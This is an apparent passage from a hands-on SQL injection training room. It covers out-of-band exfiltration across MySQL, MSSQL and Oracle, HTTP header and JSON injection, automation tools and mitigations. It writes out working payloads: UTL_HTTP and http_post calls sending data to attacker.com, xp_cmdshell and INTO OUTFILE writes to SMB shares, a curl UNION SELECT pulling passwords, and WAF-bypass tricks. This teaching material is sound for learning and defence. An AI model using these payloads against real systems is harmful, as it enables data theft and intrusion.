In scenarios where direct responses are sanitised or limited by security measures, OOB channels enable attackers to exfiltrate data without immediate feedback from the server. For instance, security mechanisms likeÂ **stored procedures**,Â **output encoding**, and a**pplication-level constraints**Â canÂ **prevent direct responses**, making traditionalÂ SQLÂ injection attacks ineffective. Out-of-band techniques, such as usingÂ DNSÂ orÂ HTTPÂ requests, allow data to be sent to an external server controlled by the attacker, circumventing these restrictions.

Additionally,Â **Intrusion Detection Systems (IDS)**Â andÂ **Web Application Firewalls (WAFs)**Â oftenÂ **monitor and logÂ SQLÂ query responses for suspicious activity**, blocking direct responses from potentially malicious queries. By leveraging OOB channels, attackers can avoid detection by using less scrutinized network protocols likeÂ DNSÂ orÂ SMBÂ to transfer data. This is particularly useful in network environments with limited direct connectivity between the attacker and the database server, such as when the server is behind aÂ firewallÂ or in a different network segment.

Techniques in Different Databases

Out-of-bandÂ SQLÂ injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:

**MySQL and MariaDB**

In MySQL or MariaDB, Out-of-bandÂ SQLÂ injection can be achieved usingÂ [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)Â orÂ [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)Â command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:

```php
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

An attacker could then access this file via anÂ SMBÂ share orÂ HTTPÂ server running on the database server, thereby exfiltrating the data through an alternate channel.

**MicrosoftÂ SQLÂ Server (MSSQL)**

In MSSQL, Out-of-bandÂ SQLÂ injection can be performed using features likeÂ [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), which allows the execution of shell commands directly fromÂ SQLÂ queries. This can be leveraged to write data to a file accessible via a network share:

```php
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

Alternatively,Â `OPENROWSET`Â orÂ `BULK INSERT`Â can be used to interact with external data sources, facilitating data exfiltration through OOB channels.  

**Oracle**  

In Oracle databases, Out-of-bandÂ SQLÂ injection can be executed using theÂ [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html)Â orÂ [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)Â packages. For instance, the UTL_HTTP package can be used to sendÂ HTTPÂ requests with sensitive data:

```php
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

Examples of Out-of-band Techniques

Out-of-bandÂ SQLÂ injection techniques in MySQL and MariaDB can utilise various network protocols to exfiltrate data. The primary methods includeÂ DNSÂ exfiltration,Â HTTPÂ requests, andÂ SMBÂ shares. Each of these techniques can be applied depending on the capabilities of the MySQL/MariaDB environment and the network setup.  

**HTTPÂ Requests**  

By leveraging database functions that allowÂ HTTPÂ requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outboundÂ HTTPÂ connections. Although MySQL and MariaDB do not natively supportÂ HTTPÂ requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.

First, the UDF needs to be created and installed to supportÂ HTTPÂ requests. This setup is complex and usually involves additional configuration. An example query would look likeÂ `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.

HTTPÂ request exfiltration can be implemented on Windows andÂ LinuxÂ (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enableÂ HTTPÂ requests.

**DNSÂ Exfiltration**Â 

Attackers can useÂ SQLÂ queries to generateÂ DNSÂ requests with encoded data, which is sent to a maliciousÂ DNSÂ server controlled by the attacker. This technique bypassesÂ HTTP-based monitoring systems and leverages the database's ability to performÂ DNSÂ lookups.

As discussed above,Â MySQL does not natively support generatingÂ DNSÂ requests throughÂ SQLÂ commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to performÂ DNSÂ lookups.

**SMBÂ Exfiltration**

SMBÂ exfiltration involves writing query results to anÂ SMBÂ share on an external server. This technique is particularly effective in Windows environments but can also be configured inÂ LinuxÂ systems with the right setup. an example query would look likeÂ `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`.

This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools likeÂ `smbclient`Â or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.

Practical Example

In this practical scenario, we will demonstrate how an attacker can exfiltrate data from a vulnerable web application using an Out-of-band SQL injection technique. The server-side code contains an SQL injection vulnerability that allows an attacker to craft a payload that writes the results of a query to an externalÂ SMBÂ share. This is useful when direct responses from the database are restricted or monitored.

**Scenario Explanation**

In this scenario, we would enable a network share on the AttackBox atÂ `ATTACKBOX_IP\logs`. This share is accessible over the network and allows files from other machines to be written to it. You may assume a scenario when you get a vulnerable system and want to pivot data to another network share system. The attacker will leverage this share to exfiltrate data Out-of-band. To have a network share, we would start the AttackBox and execute the following command in the terminal:  

- Navigate toÂ `impacket`Â directory usingÂ `cd /opt/impacket/examples`
- Enter the commandÂ `python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp`Â to start the SMB server sharing theÂ `/tmp`Â directory.
- You can access the contents of the network share by entering the commandÂ `smbclient //ATTACKBOX_IP/logs -U guest -N`. This would allow you to connect to the network share, and then you can issue the commandÂ `ls`Â to list all the commands.

We have the same web application with a search feature that queries visitors who visit the library. The server-side code for this feature is vulnerable to SQL injection, and you can access it atÂ `http://10.10.223.104/oob/search_visitor.php?visitor_name=Tim`.Â 

![response of normal query](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716632404869)  

The server code looks like this:

```php
$visitor_name = $_GET['visitor_name'] ?? '';

$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";

echo "<p>Generated SQL Query: $sql</p>";

// Execute multi-query
if ($conn->multi_query($sql)) {
    do {
        // Store first result set
        if ($result = $conn->store_result()) {
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
```

**Important Consideration**

It is important to note that the MySQL system variableÂ `secure_file_priv`Â may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations.Â 

- **When secure_file_priv is Set**: MySQL will restrict file operations such asÂ **INTO OUTFILE**Â to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
- **When secure_file_priv is Empty**: If theÂ `secure_file_priv`Â variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.

Attackers typically do not have direct access to check the value of the secure_file_priv variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.  

**Preparing the Payload**

To exploit this vulnerability, the attacker crafts a payload to inject into theÂ `visitor_name`Â parameter. The payload will be designed to execute an additionalÂ SQLÂ query that writes the database version information to an externalÂ SMBÂ share.  

```php
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```

Let's dissect the above payload:

- `1'`: Closes the original string within the SQL query.
- `;`: Ends the firstÂ SQLÂ statement.
- `SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';`: Executes a new SQL statement that retrieves the database version and writes it to an SMB share at \\ATTACKBOX_IP\logs\out.txt.
- `--`: Comments the rest of the originalÂ SQLÂ query to prevent syntax errors.

To utilize the payload, the attacker would visit the URL that creates a file in an externalÂ SMBÂ share.Â 

To access the file, use theÂ `ls /tmp`Â to see the file received in theÂ `/tmp`Â directory as shown below:Â   


```shell-session
thm@machine$ls /tmp
out.txt
```

# Other techniques
---

AdvancedÂ SQLÂ injection involves a range of sophisticated methods that go beyond basic attacks. Here are a few important advanced techniques that pentesters should be aware of:

## HTTPÂ Header Injection


![user-agent injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785793)


HTTPÂ headers can carry user input, which might be used inÂ SQLÂ queries on the server side.Â 
If these inputs are not sanitised, it can lead toÂ SQLÂ injection. The technique involves manipulatingÂ HTTPÂ headers (likeÂ **User-Agent**,Â **Referer**, orÂ **X-Forwarded-For**) to injectÂ SQLÂ commands. The server might log these headers or use them inÂ SQLÂ queries. For example, a malicious User-Agent header would look likeÂ `User-Agent: ' OR 1=1; --`.Â If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.


In this example, a web application logs the User-Agent header from HTTP requests into a table named logs in the database. The application provides an endpoint atÂ `http://10.10.223.104/httpagent/`Â that displays all the logged entries from the logs table. When users visit a webpage, their browser sends a User-Agent header, which identifies the browser and operating system. This header is typically used for logging purposes or to tailor content for specific browsers. In our application, this User-Agent header is inserted into the logs table and can then be viewed through the provided endpoint.

Given the endpoint, an attacker might attempt to injectÂ SQLÂ code into the User-Agent header to exploitÂ SQLÂ injection vulnerabilities. For instance, by setting the User-Agent header to a malicious value such asÂ `User-Agent: ' UNION SELECT username, password FROM user; --`, an attacker attempts to injectÂ SQLÂ code that combines the results from the logs table with sensitive data from the user table.

Here is the server-side code that inserts the logs.

```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
if ($conn->query($insert_sql) === TRUE) {
    echo "<p class='text-green-500'>New logs inserted successfully</p>";
} else {
    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
}

$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
..
... 
```

The User-Agent value is inserted into the logs table using an INSERTÂ SQLÂ statement. If the insertion is successful, a success message is displayed. An error message with details is shown if there is an error during insertion.

![dashboard for viewing logs](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716115666836)  

**Preparing the Payload**

We will prepare and inject anÂ SQLÂ payload into the User-Agent header to demonstrate howÂ SQLÂ injection can be exploited throughÂ HTTPÂ headers. Our target payload will beÂ ' UNION SELECT username, password FROM user; #.Â This payload is designed to:

- **Close the Existing String Literal**: The initial single quote (`'`) is used to close the existing string literal in the SQL query.
- **Inject a UNION SELECT Statement**: TheÂ `UNION SELECT username, password FROM user;`Â part of the payload is used to retrieve the username and password columns from the user table.
- **Comment Out the Rest of the Query**: TheÂ `#`Â character is used to comment out the remainder of theÂ SQLÂ query, ensuring that any subsequentÂ SQLÂ code is ignored.

We need to send this payload as part of the User-Agent header in ourÂ HTTPÂ request to inject this payload, which could be done using tools likeÂ **Burp Suite**Â orÂ **cURL**.Â We will use the curl command-line tool to send anÂ HTTPÂ request with a custom User-Agent header.Â Open a Terminal and access your command line interface.Â Use the following command to send the request with the customÂ `User-Agent`Â header:


```bash
user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.223.104/httpagent/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection </title>
 rel="stylesheet">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto p-8">
        <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1>
        <div class="bg-white p-6 rounded-lg shadow-lg">

<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>
        </div>
    </div>
</body>
</html>
```

The server's response will be displayed in the terminal. If theÂ SQLÂ injection is successful, you will see the extracted data (usernames and passwords) in the response.

Exploiting Stored Procedures

Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable toÂ SQLÂ injection if not properly handled.

![process flow of stored procedure](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792)  

Stored procedures are precompiledÂ SQLÂ statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitised, they can introduceÂ SQLÂ injection vulnerabilities.

Consider a stored procedure designed to retrieve user data based on a username:

```php
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

In this example, the stored procedure concatenates the @username parameter into a dynamicÂ SQLÂ query. This approach is vulnerable toÂ SQLÂ injection because the input is not sanitised.

XMLÂ andÂ JSONÂ InjectionÂ   

  

Applications that parseÂ XMLÂ orÂ JSONÂ data and use the parsed data inÂ SQLÂ queries can be vulnerable to injection if they do not properly sanitise the inputs.Â XMLÂ andÂ JSONÂ injection involves injecting malicious data intoÂ XMLÂ orÂ JSONÂ structures that are then used inÂ SQLÂ queries. This can occur if the application directly uses parsed values inÂ SQLÂ statements.

```php
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```

If the application uses these values directly in aÂ SQLÂ query likeÂ `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.


# Automation
---

SQLÂ Injection remains a common threat due to improper implementation of security measures and the complexity of different web frameworks_._Â Automating identification and exploiting these vulnerabilities can be challenging, but several tools and techniques have been developed to help streamline this process.

![automation of SQL injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716923453053)  

## Major Issues During Identification

IdentifyingÂ SQLÂ Injection vulnerabilities involves several challenges, similar to identifying any other server-side vulnerability. Here are the key issues:

- **Dynamic Nature ofÂ SQLÂ Queries**:Â SQLÂ queries can be dynamically constructed, making it difficult to detect injection points. Complex queries with multiple layers of logic can obscure potential vulnerabilities.
- **Variety of Injection Points**:Â SQLÂ Injection can occur in different parts of an application, including input fields,Â HTTPÂ headers, and URL parameters. Identifying all potential injection points requires thorough testing and a comprehensive understanding of the application.
- **Use of Security Measures**: Applications may use prepared statements, parameterized queries, andÂ ORMÂ frameworks, which can preventÂ SQLÂ Injection. Automated tools must be able to differentiate between safe and unsafe query constructions.
- **Context-Specific Detection**: The context in which user inputs are used inÂ SQLÂ queries can vary widely. Tools must adapt to different contexts to accurately identify vulnerabilities.

Few Important Tools

Several renowned tools and projects have been developed within the security community to aid in the automation of findingÂ SQLÂ Injection vulnerabilities. Here are a few well-known tools and GitHub repositories that provide functionalities for detecting and exploitingÂ SQLÂ Injection:

- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**:Â SQLMapÂ is an open-source tool that automates the process of detecting and exploitingÂ SQLÂ Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the toolÂ [here](https://tryhackme.com/r/room/sqlmap).
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**: SQLNinja is a tool specifically designed to exploitÂ SQLÂ Injection vulnerabilities in web applications that use MicrosoftÂ SQLÂ Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction.Â 
- [**JSQL Injection**](https://github.com/ron190/jsql-injection):Â A Java library focused on detectingÂ SQLÂ injection vulnerabilities within Java applications. It supports various types ofÂ SQLÂ Injection attacks and provides a range of options for extracting data and taking control of the database.
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql)**:Â BBQSQL is a BlindÂ SQLÂ Injection exploitation framework designed to be simple and highly effective for automated exploitation of BlindÂ SQLÂ Injection vulnerabilities.Â 

Automating the identification and exploitation ofÂ SQLÂ injection vulnerabilities is crucial for maintaining web application security. Tools likeÂ SQLMap, SQLNinja, and BBQSQL provide powerful capabilities for detecting and exploiting these vulnerabilities. However, it's important to understand the limitations of automated tools and the need for manual analysis and validation to ensure comprehensive security coverage. By integrating these tools into your security workflow and following best practices for input validation and query construction, you can effectively mitigate the risks associated withÂ SQLÂ Injection vulnerabilities.


# Best Practices
---

SQLÂ injection is a renowned and pervasive vulnerability that has been a major concern in web application security for years. Pentesters must pay special attention to this vulnerability during their assessments, as it requires a thorough understanding of various techniques to identify and exploitÂ SQLÂ injection points. Similarly, secure coders must prioritise safeguarding their applications by implementing robust input validation and adhering to secure coding practices to prevent such attacks. A few of the best practices are mentioned below:Â 

![best practices for secure coders](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989793902)

Secure Coders

- **Parameterised Queries and Prepared Statements**: Use parameterised queries and prepared statements to ensure all user inputs are treated as data rather than executable code. This technique helps preventÂ SQLÂ injection by separating the query structure from the data. For example, inÂ PHPÂ with PDO, you can prepare a statement and bind parameters, which ensures that user inputs are safely handled likeÂ `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);`.
- **Input Validation and Sanitisation**: Implement strong input validation and sanitization to ensure that inputs conform to expected formats. Validate data types, lengths, and ranges, and reject any input that does not meet these criteria. Use built-in functions such asÂ `htmlspecialchars()`Â andÂ `filter_var()`Â in PHP to sanitise inputs effectively.
- **Least Privilege Principle**: Apply the principle of least privilege by granting application accounts the minimum necessary database permissions. Avoid using database accounts with administrative privileges for everyday operations. This minimises the potential impact of a successful SQL injection attack by limiting the attacker's access to critical database functions.
- **Stored Procedures**: Encapsulate and validate SQL logic using stored procedures. This allows you to control and validate the inputs within the database itself, reducing the risk of SQL injection. Ensure that stored procedures accept only validated inputs and are designed to handle input sanitization internally.
- **Regular Security Audits and Code Reviews**: Conduct regular security audits and code reviews to identify and address vulnerabilities. Automated tools can help scan for SQL injection risks, but manual reviews are also essential to catch subtle issues. Regular audits ensure that your security practices stay up-to-date with evolving threats.

Pentesters

- **Exploiting Database-Specific Features**: Different database management systems (DBMS) have unique features and syntax. A pentester should understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL) to exploit these features effectively. For instance, MSSQL supports theÂ `xp_cmdshell`Â command, which can be used to execute system commands.
- **Leveraging Error Messages**: Exploit verbose error messages to gain insights into the database schema and structure. Error-basedÂ SQLÂ injection involves provoking the application to generate error messages that reveal useful information. For example, using 1' AND 1=CONVERT(int, (SELECT @@version)) -- can generate errors that leak version information.
- **Bypassing WAF and Filters**: Test various obfuscation techniques to bypass Web Application Firewalls (WAF) and input filters. This includes using mixed case (SeLeCt), concatenation (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))), and alternate encodings (hex, URL encoding). Additionally, using inline comments (/**/) and different character encodings (e.g., %09, %0A) can help bypass simple filters.
- **Database Fingerprinting**: Determine the type and version of the database to tailor the attack. This can be done by sending specific queries that yield different results depending on the DBMS. For instance, SELECT version() works on PostgreSQL, while SELECT @@version works on MySQL and MSSQL.
- **Pivoting withÂ SQLÂ Injection**: UseÂ SQLÂ injection to pivot and exploit other parts of the network. Once a database server is compromised, it can be used to gain access to other internal systems. This might involve extracting credentials or exploiting trust relationships between systems.

AdvancedÂ SQLÂ injection testing requires a deep understanding of various techniques and the ability to adapt to different environments. Pentesters should employ various methods, from exploiting database-specific features to bypassing sophisticated filters to thoroughly assessing and exploitingÂ SQLÂ injection vulnerabilities. Methodically documenting each step ensures a comprehensive evaluation of the application's security.


# Conclusion
---
In this room,Â we have explored several advancedÂ SQLÂ injection techniques, including Second-OrderÂ SQLÂ Injection, Out-of-BandÂ SQLi, and filter evasion.Â We also covered techniques like cookie injection, illustratingÂ the diverse methods attackers useÂ to exploit web applications.Â Our journey didn't stop at exploitation; we discussed the importance of automation in identifying and exploitingÂ SQLÂ injection vulnerabilities and leveraging tools to streamline and enhance our testing processes.  

Understanding these advanced techniques is crucial for any penetration tester aiming to uncover and address complex security flaws. Additionally, we discussed various mitigation measures to safeguard applications against these sophisticated attacks, emphasizing the need for a robust security posture.

As a penetration tester, your role is not only to find vulnerabilities but also to understand the best practices for remediation and prevention. Armed with the knowledge from this room, you are better equipped to protect web applications, ensuring they are resilient against the evolving landscape ofÂ SQLÂ injection threats.
